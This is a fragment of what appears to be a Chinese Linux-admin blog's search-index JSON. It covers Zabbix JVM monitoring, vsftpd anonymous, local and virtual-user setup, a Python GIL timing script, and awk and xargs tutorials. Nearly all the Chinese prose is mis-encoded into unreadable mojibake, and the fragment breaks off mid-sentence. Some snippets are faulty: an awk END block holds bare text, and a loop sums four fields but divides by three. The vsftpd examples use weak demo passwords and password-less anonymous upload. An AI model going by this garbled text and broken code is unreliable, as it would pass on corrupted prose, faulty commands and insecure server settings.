36719-aeepest8k1c.png 3.æ·»åŠ æ¨¡æ¿ 94645-gmllznmrf1c.png 4.æ£€æŸ¥ç»“æœ 58728-bozgpc2sn2r.png ","date":"2020-12-24 11:56","objectID":"/post/2138/:5:0","tags":["zabbix","jvm"],"title":"zabbixä½¿ç”¨zabbix-java-gatewayç›‘æ§JVM","uri":"/post/2138/"},{"categories":["ç›‘æ§"],"content":"å…­ã€æ¨èæ¨¡æ¿ https://github.com/rodrigoluissilva/Zabbix-JMX-Tomcat-Extended-Template/tree/master æ ¹æ®è‡ªå·±çš„éœ€è¦é€‰æ‹©æ¨¡æ¿å¯¼å…¥å³å¯,ä¸‹é¢æ¼”ç¤ºä¸€ä¸ª 1.å¯¼å…¥æ¨¡æ¿ 83878-q1wrlyf6hya.png 2.ç»™ä¸»æœºé“¾æ¥æ¨¡æ¿ 25563-my7ap5gwyor.png 3.ä¿®æ”¹å®,æˆ‘çš„ç«¯å£æ˜¯8081ã€‚{$HTTP_PORT},{$JMX_PASSWORD},{$JMX_USERNAME} 14524-prrpedd28bi.png 4.ç»™æ¨¡æ¿æ·»åŠ å®å˜é‡,åœ¨ä¸»æœºä¸­å•ç‹¬è®¾ç½®ä¹Ÿå¯ä»¥ã€‚æˆ‘è¿™é‡Œæ˜¯tomcat8,é»˜è®¤è¿æ¥å™¨æ˜¯nioæ¨¡å¼ 72420-eariq5aq21n.png ","date":"2020-12-24 11:56","objectID":"/post/2138/:6:0","tags":["zabbix","jvm"],"title":"zabbixä½¿ç”¨zabbix-java-gatewayç›‘æ§JVM","uri":"/post/2138/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€å»ºç«‹ç”¨æˆ·æ•°æ®æ–‡ä»¶ vim /etc/vsftpd/vsftpd.user user1 123 user2 123 user3 123 user4 123 user5 123 æ ¼å¼: ä¸€è¡Œç”¨æˆ·ä¸€è¡Œå¯†ç  è½¬æ¢ä¸ºdbæ–‡ä»¶ db_load -T -t hash -f /etc/vsftpd/vsftpd.user /etc/vsftpd/vsftpd.db chmod 400 /etc/vsftpd/vsftpd.db # è®¾ç½®åªè¯»æƒé™ ","date":"2020-12-23 16:21","objectID":"/post/2131/:1:0","tags":["vsftpd","ftp"],"title":"vsftpdè™šæ‹Ÿç”¨æˆ·é…ç½®(ä¸‰)","uri":"/post/2131/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äºŒã€åˆ›å»ºftpæ˜ å°„ç”¨æˆ·å’Œæ•°æ®å­˜æ”¾ç›®å½• mkdir /data/ftp -p useradd -s /sbin/nologin -d /data/ftp/ ftp_user chown -R ftp_user:ftp_user /data/ftp ","date":"2020-12-23 16:21","objectID":"/post/2131/:2:0","tags":["vsftpd","ftp"],"title":"vsftpdè™šæ‹Ÿç”¨æˆ·é…ç½®(ä¸‰)","uri":"/post/2131/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸‰ã€å»ºç«‹pamè®¤è¯æ–‡ä»¶ vim /etc/pam.d/vsftpd.pam auth required pam_userdb.so db=/etc/vsftpd/vsftpd account required pam_userdb.so db=/etc/vsftpd/vsftpd ","date":"2020-12-23 16:21","objectID":"/post/2131/:3:0","tags":["vsftpd","ftp"],"title":"vsftpdè™šæ‹Ÿç”¨æˆ·é…ç½®(ä¸‰)","uri":"/post/2131/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å››ã€åˆ›å»ºç”¨æˆ·é…ç½®ç›®å½• mkdir /etc/vsftpd/users/ ","date":"2020-12-23 16:21","objectID":"/post/2131/:4:0","tags":["vsftpd","ftp"],"title":"vsftpdè™šæ‹Ÿç”¨æˆ·é…ç½®(ä¸‰)","uri":"/post/2131/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äº”ã€ä¿®æ”¹å‚æ•° # å…è®¸åœ¨å®¶ç›®å½•ä¸‹æ“ä½œ allow_writeable_chroot=YES # vsftpdä½¿ç”¨çš„PAMæœåŠ¡çš„åç§° pam_service_name=vsftpd.pam # å°†æ‰€æœ‰éåŒ¿åç”¨æˆ·å½’ç±»ä¸ºè®¿å®¢ç™»å½•,å°†è®¿å®¢é‡æ–°æ˜ å°„åˆ°guest_usernameå‚æ•°æŒ‡å®šçš„ç”¨æˆ· guest_enable=YES # æ˜ å°„çš„ç”¨æˆ· guest_username=ftp_user # ç”¨æˆ·çš„é…ç½®ç›®å½• #å¦‚æœæ‚¨å°†user_config_dirè®¾ç½®ä¸º/etc/vsftpd/users/ï¼Œç„¶åä»¥ç”¨æˆ·\"chris\"çš„èº«ä»½ç™»å½•ï¼Œé‚£ä¹ˆvsftpdå°†åœ¨ä¼šè¯æœŸé—´åº”ç”¨/etc/vsftpd/users/chrisæ–‡ä»¶ä¸­çš„è®¾ç½®ã€‚ user_config_dir=/etc/vsftpd/users/ é»˜è®¤æƒ…å†µä¸‹è™šæ‹Ÿç”¨æˆ·ä½¿ç”¨çš„æ˜¯åŒ¿åç”¨æˆ·æƒé™,éœ€è¦æ³¨æ„é…ç½®å†²çªçš„é—®é¢˜ã€‚æœ€å¥½åœ¨ä¸»é…ç½®æ–‡ä»¶ä¸­æœ€å°åŒ–é…ç½®ï¼Œå°†è™šæ‹Ÿç”¨æˆ·çš„é…ç½®å•ç‹¬é…ç½®åˆ°user_config_diræŒ‡å®šçš„ç›®å½•ä¸­ å¯ä»¥é€šè¿‡virtual_use_local_privså‚æ•°ä¿®æ”¹è™šæ‹Ÿç”¨æˆ·ä½¿ç”¨æœ¬åœ°ç”¨æˆ·æƒé™ ","date":"2020-12-23 16:21","objectID":"/post/2131/:5:0","tags":["vsftpd","ftp"],"title":"vsftpdè™šæ‹Ÿç”¨æˆ·é…ç½®(ä¸‰)","uri":"/post/2131/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å…­ã€åˆ›å»ºè™šæ‹Ÿç”¨æˆ· vim /etc/vsftpd/users/user1 æ³¨æ„ç”¨æˆ·åå’Œvsftpd.userçš„ä¸€è‡´ # å…è®¸ä¸Šä¼  anon_upload_enable=YES # é»˜è®¤æƒé™ï¼Œ755å’Œ644 anon_umask=022 å®¢æˆ·ç«¯æµ‹è¯• # ä¸Šä¼ ä¸‹è½½å’Œæ–‡ä»¶æƒé™æ²¡é—®é¢˜ [soulchild@MBP test111]$ lftp 10.0.0.13 -u user1,123 lftp user1@10.0.0.13:~\u003e !ls aaa fun1 fun2 fun3 num4.sh lftp user1@10.0.0.13:~\u003e put fun1 20 bytes transferred lftp user1@10.0.0.13:/\u003e ls -rw-r--r-- 1 1003 1003 20 Dec 23 10:11 fun1 lftp user1@10.0.0.13:/\u003e get fun1 -o fun1-remote 20 bytes transferred lftp user1@10.0.0.13:/\u003e !ls aaa fun1 fun1-remote fun2 fun3 num4.sh # åˆ›å»ºæ–‡ä»¶å¤¹ä¼šå¤±è´¥ lftp user1@10.0.0.13:/\u003e mkdir my_user1 mkdir: Access failed: 550 Permission denied. (my_user1) åˆ›å»ºå¦ä¸€ä¸ªç”¨æˆ· vim /etc/vsftpd/users/user1 # å…è®¸åˆ›å»ºæ–‡ä»¶å¤¹ anon_mkdir_write_enable=YES å®¢æˆ·ç«¯æµ‹è¯• # å¯ä»¥åˆ›å»ºæ–‡ä»¶å¤¹ lftp user2@10.0.0.13:/\u003e ls -rw-r--r-- 1 1003 1003 20 Dec 23 10:11 fun1 lftp user2@10.0.0.13:/\u003e mkdir test mkdir ok, `test' created lftp user2@10.0.0.13:/\u003e ls -rw-r--r-- 1 1003 1003 20 Dec 23 10:11 fun1 drwx------ 2 1003 1003 6 Dec 23 10:17 test # ä¸å…è®¸ä¸Šä¼  lftp user2@10.0.0.13:/\u003e put fun3 put: Access failed: 550 Permission denied. (fun3) å…¶ä»–å‚æ•°ï¼š # å…è®¸åŒ¿åç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ anon_upload_enable=YES # å…è®¸åŒ¿åç”¨æˆ·åˆ›å»ºç›®å½•,å¿…é¡»å¯¹çˆ¶ç›®å½•æœ‰å†™æƒé™æ‰èƒ½åˆ›å»º anon_mkdir_write_enable=YES # å…è®¸åŒ¿åç”¨æˆ·æ‰§è¡Œé™¤ä¸Šä¼ å’Œåˆ›å»ºç›®å½•ä¹‹å¤–çš„å†™æ“ä½œï¼Œä¾‹å¦‚åˆ é™¤å’Œé‡å‘½åã€‚ anon_other_write_enable=YES # åŒ¿åç”¨æˆ·çš„æœ€å¤§ä¼ è¾“é€Ÿåº¦é™åˆ¶,å•ä½byteã€‚1048576Byte=1MB # anon_max_rate=1048576 # æ–‡ä»¶(å¤¹)åˆ›å»ºçš„é»˜è®¤æƒé™ã€‚ æ–‡ä»¶å¤¹777-022=755ï¼Œé»˜è®¤æƒé™å°±æ˜¯drwxr-xr-x æ–‡ä»¶666-022=644ï¼Œé»˜è®¤æƒé™å°±æ˜¯-rw-r--r-- anon_umask=022 # åŒ¿åç”¨æˆ·çš„æ ¹ç›®å½• anon_root=/var/ftp/ # ç”¨æˆ·å˜é‡ï¼Œå½“å‰ç™»å½•ç”¨æˆ·èµ‹å€¼ç»™$USER(ä¸»é…ç½®æ–‡ä»¶é…ç½®) user_sub_token=$USER # å¦‚æœæƒ³æ¯ä¸ªç”¨æˆ·åˆ°è‡ªå·±çš„ç›®å½•,å¯ä»¥åšå¦‚ä¸‹é…ç½® local_root=/data/ftp/$USER æ›´å¤šå‚æ•°ï¼šhttp://vsftpd.beasts.org/vsftpd_conf.html ","date":"2020-12-23 16:21","objectID":"/post/2131/:6:0","tags":["vsftpd","ftp"],"title":"vsftpdè™šæ‹Ÿç”¨æˆ·é…ç½®(ä¸‰)","uri":"/post/2131/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æœ¬åœ°ç”¨æˆ· ç”¨æˆ·åå¯†ç ï¼šä½¿ç”¨çš„æ˜¯æ“ä½œç³»ç»Ÿçš„ç³»ç»Ÿè´¦å·å¯†ç  é»˜è®¤ç›®å½•ï¼šç”¨æˆ·å®¶ç›®å½• ","date":"2020-12-23 14:17","objectID":"/post/2130/:1:0","tags":["vsftpd","ftp"],"title":"vsftpdæœ¬åœ°ç”¨æˆ·(ç³»ç»Ÿç”¨æˆ·)æ¨¡å¼(äºŒ)","uri":"/post/2130/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åˆ›å»ºç”¨æˆ· useradd -s /sbin/nologin -d /data/ftp/test_u1 test_u1 echo \"123\" | passwd --stdin test_u1 ç›¸å…³å‚æ•° # å¯ç”¨æœ¬åœ°ç”¨æˆ· local_enable=YES # åˆ›å»ºæ–‡ä»¶(å¤¹)çš„é»˜è®¤æƒé™ local_umask=022 # æœ¬åœ°ç”¨æˆ·çš„æ ¹ç›®å½• local_root=/var/ftp ####################################################################### # å°†æ‰€æœ‰ç”¨æˆ·ç¦é”¢åœ¨ä¸»ç›®å½•,é˜²æ­¢åˆ‡æ¢åˆ°ç³»ç»Ÿæ ¹ç›®å½• chroot_local_user=YES # å¯ç”¨åå¯ä»¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶(chroot_list_fileå‚æ•°)ï¼Œæ–‡ä»¶ä¸­çš„ç”¨æˆ·ä¼šè¢«ç¦é”¢åœ¨ä¸»ç›®å½•ã€‚ # å½“chroot_local_user=YESæ—¶,æ–‡ä»¶ä¸­çš„ç”¨æˆ·ä¸ä¼šè¢«ç¦é”¢åœ¨ä¸»ç›®å½• chroot_list_enable=YES # ç”¨æˆ·åˆ—è¡¨æ–‡ä»¶(é…åˆchroot_list_enable=YESä½¿ç”¨) chroot_list_file=/etc/vsftpd/chroot_list # è¢«é™åˆ¶çš„ç”¨æˆ·ï¼Œåœ¨å®¶ç›®å½•æ“ä½œæ—¶è¢«æŠ¥500,æ·»åŠ å¦‚ä¸‹å‚æ•°å³å¯ allow_writeable_chroot=YES ####################################################################### # é™åˆ¶é€Ÿåº¦,å•ä½byteã€‚1048576byte=1M local_max_rate=1048576 # æ¬¢è¿è¯­ ftpd_banner=\"hello\" ####################################################################### # å¯ç”¨ä¼šä½¿userlist_fileç”Ÿæ•ˆï¼Œå®ç°çš„æ•ˆæœå–å†³äºuserlist_denyçš„é…ç½®ã€‚ userlist_enable=YES # é»˜è®¤å€¼æ˜¯YES,æ‹’ç»userlist_fileä¸­çš„ç”¨æˆ·ç™»å½•ã€‚NOä»£è¡¨åªå…è®¸userlist_fileä¸­çš„ç”¨æˆ·ç™»å½• userlist_deny=YES # ç”¨æˆ·åˆ—è¡¨æ–‡ä»¶(é…åˆuserlist_enable=YESä½¿ç”¨) userlist_file=/etc/vsftpd.user_list # /etc/vsftpd/ftpusersè¿™ä¸ªæ–‡ä»¶é‡Œçš„ç”¨æˆ·æ˜¯æ‹’ç»ç™»å½•çš„ï¼Œä¼˜å…ˆçº§æœ€é«˜ ####################################################################### ","date":"2020-12-23 14:17","objectID":"/post/2130/:2:0","tags":["vsftpd","ftp"],"title":"vsftpdæœ¬åœ°ç”¨æˆ·(ç³»ç»Ÿç”¨æˆ·)æ¨¡å¼(äºŒ)","uri":"/post/2130/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸€ã€å®‰è£…å¯åŠ¨ vsftp: serverç«¯ ftp: å®¢æˆ·ç«¯ yum install -y vsftpd ftp systemctl enable vsftpd systemctl start vsftpd é»˜è®¤ç›®å½•: /var/ftp/ ","date":"2020-12-23 11:54","objectID":"/post/2129/:1:0","tags":["vsftpd","ftp"],"title":"vsftpdå®‰è£…å’ŒåŒ¿åæ¨¡å¼(ä¸€)","uri":"/post/2129/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"äºŒã€åŒ¿åæ¨¡å¼ åŒ¿åç”¨æˆ·: ftpæˆ–anonymous å¯†ç ä¸ºç©º å·¥ä½œç›®å½•: /var/ftp/ é»˜è®¤æƒé™: å¯ä¸‹è½½ä¸å¯ä¸Šä¼  ","date":"2020-12-23 11:54","objectID":"/post/2129/:2:0","tags":["vsftpd","ftp"],"title":"vsftpdå®‰è£…å’ŒåŒ¿åæ¨¡å¼(ä¸€)","uri":"/post/2129/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸‰ã€ç›¸å…³å‚æ•°å‚æ•° # å¯ç”¨åŒ¿åç”¨æˆ· anonymous_enable=YES # å…è®¸åŒ¿åç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ anon_upload_enable=YES # å…è®¸åŒ¿åç”¨æˆ·åˆ›å»ºç›®å½•,å¿…é¡»å¯¹çˆ¶ç›®å½•æœ‰å†™æƒé™æ‰èƒ½åˆ›å»º anon_mkdir_write_enable=YES # å…è®¸åŒ¿åç”¨æˆ·æ‰§è¡Œé™¤ä¸Šä¼ å’Œåˆ›å»ºç›®å½•ä¹‹å¤–çš„å†™æ“ä½œï¼Œä¾‹å¦‚åˆ é™¤å’Œé‡å‘½åã€‚ anon_other_write_enable=YES # åŒ¿åç”¨æˆ·ç™»å½•ä¸è¯¢é—®å¯†ç  no_anon_password=YES # åŒ¿åç”¨æˆ·çš„æœ€å¤§ä¼ è¾“é€Ÿåº¦é™åˆ¶,å•ä½byteã€‚1048576Byte=1MB # anon_max_rate=1048576 # æ–‡ä»¶(å¤¹)åˆ›å»ºçš„é»˜è®¤æƒé™ã€‚ æ–‡ä»¶å¤¹777-022=755ï¼Œé»˜è®¤æƒé™å°±æ˜¯drwxr-xr-x æ–‡ä»¶666-022=644ï¼Œé»˜è®¤æƒé™å°±æ˜¯-rw-r--r-- anon_umask=022 # åŒ¿åç”¨æˆ·çš„æ ¹ç›®å½• anon_root=/var/ftp/ æ›´å¤šå‚æ•°ï¼šhttp://vsftpd.beasts.org/vsftpd_conf.html ","date":"2020-12-23 11:54","objectID":"/post/2129/:3:0","tags":["vsftpd","ftp"],"title":"vsftpdå®‰è£…å’ŒåŒ¿åæ¨¡å¼(ä¸€)","uri":"/post/2129/"},{"categories":["python"],"content":" \"\"\" åŸç†å‰–æ:http://c.biancheng.net/view/5537.html GILçš„åŠŸèƒ½æ˜¯ï¼šåœ¨CPythonè§£é‡Šå™¨ä¸­æ‰§è¡Œçš„æ¯ä¸€ä¸ªPythonçº¿ç¨‹ï¼Œéƒ½ä¼šå…ˆé”ä½è‡ªå·±(çº¿ç¨‹)ï¼Œä»¥é˜»æ­¢åˆ«çš„çº¿ç¨‹æ‰§è¡Œã€‚ åœ¨cpythonè§£é‡Šå™¨ä¸­,åŒä¸€ä¸ªè¿›ç¨‹ä¸‹å¼€å¯çš„å¤šçº¿ç¨‹ï¼ŒåŒä¸€ä¸ªæ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œï¼Œæ— æ³•åˆ©ç”¨å¤šæ ¸ä¼˜åŠ¿ã€‚ ä¹Ÿå°±æ˜¯è¯´ç”±äºå…¨å±€è§£é‡Šå™¨é”(GIL)çš„åŸå› ï¼Œcpythonæ²¡æœ‰çœŸæ­£æ„ä¹‰ä¸Šçš„å¤šçº¿ç¨‹ \"\"\" # IOå¯†é›†å‹é€‚åˆå¤šçº¿ç¨‹ # è®¡ç®—å¯†é›†å‹é€‚åˆå¤šè¿›ç¨‹ from multiprocessing import Process from threading import Thread import os import time ######################################################################## # è®¡ç®—å¯†é›†å‹ # def work(): # res = 1 # for i in range(100000000): # res *= i # return res # # # if __name__ == '__main__': # print(\"cpus\", os.cpu_count()) # start_time = time.time() # l = [] # # å°†è®¡ç®—ä»»åŠ¡ï¼Œç”¨å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹è¿è¡Œ4æ¬¡çš„æ—¶é—´æ¯”è¾ƒ # for i in range(4): # # 4ä¸ªè¿›ç¨‹åŸºæœ¬åŒæ—¶è¿è¡Œ(cpuæ”¯æŒæ•°é‡)ï¼Œå•è¿›ç¨‹è¿è¡Œéœ€è¦4sï¼Œæ‰€ä»¥æ€»æ—¶é—´åœ¨4så¤šä¸€ç‚¹ï¼Œå› ä¸ºåŒä¸€æ—¶é—´æœ‰4ä¸ªè¿›ç¨‹åŒæ—¶è¿è¡Œ # # w = Process(target=work) # è¿è¡Œæ—¶é—´4.5s # # # 4ä¸ªçº¿ç¨‹å¹¶å‘æ‰§è¡Œï¼Œæ¯ä¸ªçº¿ç¨‹ä¹‹é—´ç”±äºæœ‰GILé”çš„åŸå› ,çº¿ç¨‹ä¼šæ¥å›åˆ‡æ¢ï¼Œå®é™…ä¸ŠåŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œã€‚ # # ç”±äºcpuè®¡ç®—çš„æ—¶å€™å¹¶æ²¡æœ‰åŒæ—¶è®¡ç®—ï¼Œæ‰€ä»¥å•çº¿ç¨‹4s,4çº¿ç¨‹éœ€è¦16så¤šä¸€ç‚¹ # w = Thread(target=work) # è¿è¡Œæ—¶é—´16.3s # l.append(w) # w.start() # # for i in l: # i.join() # # print('è¿è¡Œç»“æŸ%s' % (time.time() - start_time)) ######################################################################## # IOå¯†é›†å‹ def work(): time.sleep(2) if __name__ == '__main__': print(\"cpus\", os.cpu_count()) start_time = time.time() l = [] # å°†IOä»»åŠ¡ï¼Œç”¨å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹è¿è¡Œ400æ¬¡çš„æ—¶é—´æ¯”è¾ƒ for i in range(400): # å¼€å¯çš„æ•°é‡è¶Šå¤šï¼Œè¿›ç¨‹å’Œçº¿ç¨‹çš„å·®è·è¶Šæ˜æ˜¾ # å¼€å¯400ä¸ªè¿›ç¨‹,å­è¿›ç¨‹éœ€è¦å¤åˆ¶ä¸»è¿›ç¨‹çš„èµ„æº,å¤åˆ¶æ˜¯æœ‰æŸè€—çš„,æ‰€ä»¥å•æ¬¡è¿è¡Œæ—¶é—´æ˜¯2ç§’,åŠ ä¸ŠæŸè€—å°†è¿‘1ç§’ w = Process(target=work) # è¿è¡Œæ—¶é—´2.99s # å¼€å¯400ä¸ªçº¿ç¨‹,çº¿ç¨‹çš„èµ„æºæ˜¯å…±äº«ä¸»çº¿ç¨‹çš„,å› ä¸ºæ²¡æœ‰æ¶‰åŠåˆ°è®¡ç®—ï¼Œè¿è¡Œæ—¶é—´å–å†³äºIOæ—¶é—´ # æ‰€ä»¥å•æ¬¡è¿è¡Œæ—¶é—´æ˜¯2s,æ€»æ—¶é—´åœ¨2så¤šä¸€ç‚¹ # w = Thread(target=work) # è¿è¡Œæ—¶é—´2.02s l.append(w) w.start() for i in l: i.join() print('è¿è¡Œç»“æŸ%s' % (time.time() - start_time)) ","date":"2020-12-22 10:58","objectID":"/post/2123/:0:0","tags":["python"],"title":"python-GILé”ä»‹ç»è¿›ç¨‹çº¿ç¨‹æ•ˆç‡æ¯”è¾ƒ","uri":"/post/2123/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"åŸæ–‡é“¾æ¥ï¼šhttp://www.ruanyifeng.com/blog/2018/11/awk.html ","date":"2020-12-17 17:30","objectID":"/post/2117/:0:0","tags":[],"title":"awkå‘½ä»¤ä½¿ç”¨","uri":"/post/2117/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"åŸºæœ¬ç”¨æ³• awkæ˜¯ä¸€è¡Œä¸€è¡Œå¤„ç†æ•°æ®çš„ # æ ¼å¼ $ awk åŠ¨ä½œ æ–‡ä»¶å # ç¤ºä¾‹ $ echo 'this is a test' | awk '{print $1}' this ","date":"2020-12-17 17:30","objectID":"/post/2117/:1:0","tags":[],"title":"awkå‘½ä»¤ä½¿ç”¨","uri":"/post/2117/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"å¸¸è§å˜é‡ 0: å®Œæ•´çš„å†…å®¹ $n: åˆ†å‰²åçš„å†…å®¹$1å°±æ˜¯ç¬¬ä¸€éƒ¨åˆ†.$2å°±æ˜¯ç¬¬äºŒéƒ¨åˆ† FILENAMEï¼šå½“å‰æ–‡ä»¶å FSï¼šå­—æ®µåˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ã€‚ä¹Ÿå¯ä»¥-Få‚æ•°æ¥ä¿®æ”¹ RSï¼šè¡Œåˆ†éš”ç¬¦ï¼Œç”¨äºåˆ†å‰²æ¯ä¸€è¡Œï¼Œé»˜è®¤æ˜¯æ¢è¡Œç¬¦ã€‚ OFSï¼šè¾“å‡ºå­—æ®µçš„åˆ†éš”ç¬¦ï¼Œç”¨äºæ‰“å°æ—¶åˆ†éš”å­—æ®µï¼Œé»˜è®¤ä¸ºç©ºæ ¼ã€‚ ORSï¼šè¾“å‡ºè®°å½•çš„åˆ†éš”ç¬¦ï¼Œç”¨äºæ‰“å°æ—¶åˆ†éš”è®°å½•ï¼Œé»˜è®¤ä¸ºæ¢è¡Œç¬¦ã€‚ OFMTï¼šæ•°å­—è¾“å‡ºçš„æ ¼å¼ï¼Œé»˜è®¤ä¸ºï¼….6gã€‚(%f åé¢å¦‚æœä¸æ»¡6ä½å°æ•°å°±è¡¥0,%g ä¸è¡¥0ä¸æ˜¾ç¤º) NF: NFä»£è¡¨å½“å‰æœ‰å¤šå°‘åˆ—(å°æŠ€å·§:$NFä»£è¡¨æœ€åä¸€åˆ—çš„å†…å®¹ï¼‰ æ‰“å°ç¬¬ä¸€åˆ—å’Œå€’æ•°ç¬¬äºŒåˆ—,,ä»£è¡¨ä½¿ç”¨ç©ºæ ¼åˆ†å‰²æ˜¾ç¤º awk -F ':' '{print $1, $(NF-1)}' /etc/passwd root /root bin /bin daemon /sbin adm /var/adm NR: å½“å‰å¤„ç†çš„æ˜¯ç¬¬å‡ è¡Œ ","date":"2020-12-17 17:30","objectID":"/post/2117/:2:0","tags":[],"title":"awkå‘½ä»¤ä½¿ç”¨","uri":"/post/2117/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"å‡½æ•° toupper()ï¼šå­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ tolower()ï¼šå­—ç¬¦è½¬ä¸ºå°å†™ length()ï¼šè¿”å›å­—ç¬¦ä¸²é•¿åº¦ substr()ï¼šè¿”å›å­å­—ç¬¦ä¸² sin()ï¼šæ­£å¼¦ cos()ï¼šä½™å¼¦ sqrt()ï¼šå¹³æ–¹æ ¹ rand()ï¼šéšæœºæ•° awkå†…ç½®å‡½æ•°çš„å®Œæ•´åˆ—è¡¨ï¼Œå¯ä»¥æŸ¥çœ‹æ‰‹å†Œ awk -F ':' '{ print toupper($1) }' /etc/passwd ROOT BIN DAEMON ADM ","date":"2020-12-17 17:30","objectID":"/post/2117/:3:0","tags":[],"title":"awkå‘½ä»¤ä½¿ç”¨","uri":"/post/2117/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"æ¡ä»¶ awkå…è®¸æŒ‡å®šè¾“å‡ºæ¡ä»¶ï¼Œåªè¾“å‡ºç¬¦åˆæ¡ä»¶çš„è¡Œã€‚ è¾“å‡ºæ¡ä»¶è¦å†™åœ¨åŠ¨ä½œçš„å‰é¢ã€‚ awk 'æ¡ä»¶ åŠ¨ä½œ' æ–‡ä»¶å è¯·çœ‹ä¸‹é¢çš„ä¾‹å­ã€‚ $ awk -F ':' '/usr/ {print $1}' /etc/passwd root daemon bin sys ä¸Šé¢ä»£ç ä¸­ï¼Œprintå‘½ä»¤å‰é¢æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œåªè¾“å‡ºåŒ…å«usrçš„è¡Œã€‚ ä¸‹é¢çš„ä¾‹å­åªè¾“å‡ºå¥‡æ•°è¡Œï¼Œä»¥åŠè¾“å‡ºç¬¬ä¸‰è¡Œä»¥åçš„è¡Œã€‚ # è¾“å‡ºå¥‡æ•°è¡Œ $ awk -F ':' 'NR % 2 == 1 {print $1}' /etc/passwd root bin sync # è¾“å‡ºç¬¬ä¸‰è¡Œä»¥åçš„è¡Œ $ awk -F ':' 'NR \u003e3 {print $1}' /etc/passwd sys sync ä¸‹é¢çš„ä¾‹å­è¾“å‡ºç¬¬ä¸€ä¸ªå­—æ®µç­‰äºæŒ‡å®šå€¼çš„è¡Œã€‚ awk -F ':' '$1 == \"root\" {print $1}' /etc/passwd root # æˆ–è€… awk -F ':' '$1 == \"root\" || $1 == \"bin\" {print $1}' /etc/passwd root bin ","date":"2020-12-17 17:30","objectID":"/post/2117/:4:0","tags":[],"title":"awkå‘½ä»¤ä½¿ç”¨","uri":"/post/2117/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"if è¯­å¥ awkæä¾›äº†ifç»“æ„ï¼Œç”¨äºç¼–å†™å¤æ‚çš„æ¡ä»¶ã€‚ $ awk -F ':' '{if ($1 \u003e \"m\") print $1}' /etc/passwd root sys sync ä¸Šé¢ä»£ç è¾“å‡ºç¬¬ä¸€ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§äºmçš„è¡Œã€‚ ifç»“æ„è¿˜å¯ä»¥æŒ‡å®šelseéƒ¨åˆ†ã€‚ awk -F ':' '{if ($1 \u003e \"m\") print $1; else print \"---\"}' demo.txt root --- --- sys sync ","date":"2020-12-17 17:30","objectID":"/post/2117/:5:0","tags":[],"title":"awkå‘½ä»¤ä½¿ç”¨","uri":"/post/2117/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"é¢„å¤„ç†BEGINå’Œåå¤„ç†END # æ ¼å¼ awk 'BEGIN{å¤„ç†å‰} {å¤„ç†ä¸­} END{å¤„ç†å}' /etc/passwd # ç¤ºä¾‹ awk -F: 'BEGIN{print \"å¤„ç†å‰\"} {print $1,\"å¤„ç†ä¸­\"} END{å¤„ç†å}' /etc/passwd ","date":"2020-12-17 17:30","objectID":"/post/2117/:6:0","tags":[],"title":"awkå‘½ä»¤ä½¿ç”¨","uri":"/post/2117/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"å¾ªç¯ awk '{total = 0 for (var = 1; var \u003c 5; var++){total += $var} avg = total / 3 print \"Average:\",avg }' testfile ","date":"2020-12-17 17:30","objectID":"/post/2117/:7:0","tags":[],"title":"awkå‘½ä»¤ä½¿ç”¨","uri":"/post/2117/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"å‚è€ƒé“¾æ¥ï¼šhttp://www.ruanyifeng.com/blog/2019/08/xargs-tutorial.html ","date":"2020-12-17 10:44","objectID":"/post/2110/:0:0","tags":[],"title":"xargså‘½ä»¤ä½¿ç”¨","uri":"/post/2110/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"xargs å‘½ä»¤çš„ä½œç”¨ ** ç®¡é“çš„ä½œç”¨æ˜¯å°†æ ‡å‡†è¾“å‡ºè½¬æ¢æˆæ ‡å‡†è¾“å…¥ ** ** xargså¯ä»¥å°†æ ‡å‡†è¾“å…¥è½¬ä¸ºå‘½ä»¤è¡Œå‚æ•° ** echo \"hello world\" | echo æ²¡æœ‰è¾“å‡ºã€‚å› ä¸ºç®¡é“å³ä¾§çš„echoä¸æ¥å—æ ‡å‡†è¾“å…¥ echo \"hello world\" | xargs echo è¾“å‡ºhello world ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:0","tags":[],"title":"xargså‘½ä»¤ä½¿ç”¨","uri":"/post/2110/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"1. -då‚æ•°-åˆ†éš”ç¬¦ é»˜è®¤æƒ…å†µä¸‹ï¼Œxargså°†æ¢è¡Œç¬¦å’Œç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦ï¼ŒæŠŠæ 